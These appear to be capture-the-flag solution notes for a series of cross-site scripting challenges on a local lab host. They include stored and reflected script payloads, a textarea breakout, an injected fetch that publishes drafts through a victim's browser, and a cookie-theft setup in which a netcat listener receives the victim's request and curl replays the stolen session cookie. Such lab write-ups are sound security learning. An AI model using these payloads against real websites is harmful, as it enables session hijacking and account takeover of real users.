# XSS

## XSS 1

[Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)

Submit HTML of input boxes as a post

```html
<input> </input>
<input> </input>
```

## XSS 2

Submit script for alert as a post

```html
<script> alert("PWNED"); </script>
```

## XSS 3

[Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)

Send the script (AS IN [xss 2](./XSS%202.md)) as a url parameter

```text
http://challenge.localhost/?msg=%3Cscript%3Ealert%28%22PWNED%22%29%3C%2Fscript%3E
```

## XSS 4

[XSS Contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)

Break out of the textarea and inject the script:

```html
</textarea><script>alert("PWNED");</script>
```

## XSS 5

Log in as "hacker" (credentials given in the server code) \
Inspect and open Networks tab. Click on "Publish your drafts", and copy the GET request as Fetch. \
Attach the fetch request to `onload` event:

```html
<script>
    window.onload= async function(){
        await fetch("http://challenge.localhost/publish", {
            "credentials": "include",
            .
            .
            other copied stuff
        });
    };
</script>
```

Publish this as a post.

## XSS 6

Similar to the previous.

## XSS 7.md

Previous solution doesn't work, as posting by admin is disallowed. So have to login as admin to see drafts.

Set up a listener:

```shell
nc -l -v challenge.localhost 20000
```

Craft a post to steal cookie:

```html
<script>
window.onload = async function() {
    try {
        await fetch("http://challenge.localhost:20000", {
            method: "GET",
            credentials: "include" 
        });
    } catch (error) {
        console.error("Error:", error);
    }
};
</script>
```

After getting the cookie, login:

```shell
curl -v --cookie "<stolen-cookie>"  http://challenge.localhost/
```
